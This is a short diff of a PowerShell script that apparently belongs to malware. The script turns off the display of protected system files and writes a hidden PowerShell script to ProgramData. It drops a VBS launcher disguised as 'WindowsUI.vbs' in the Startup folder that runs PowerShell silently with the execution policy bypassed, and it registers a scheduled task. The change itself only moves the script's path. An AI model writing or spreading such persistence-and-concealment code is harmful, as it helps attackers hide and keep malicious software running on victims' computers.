@@ -8,10 +8,10 @@ Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Micros
 $psScriptContent = @'
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 0
 '@
-Set-Content -Path "C:\ProgramData\Microsoft\DisableShowSuperHidden.ps1" -Value $psScriptContent
+Set-Content -Path "C:\ProgramData\DisableShowSuperHidden.ps1" -Value $psScriptContent
 $vbsScriptContent = @'
 Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\DisableShowSuperHidden.ps1", 0, True
+objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\DisableShowSuperHidden.ps1", 0, True
 '@
 Set-Content -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUI.vbs" -Value $vbsScriptContent
 $taskName = "DisableShowSuperHidden"
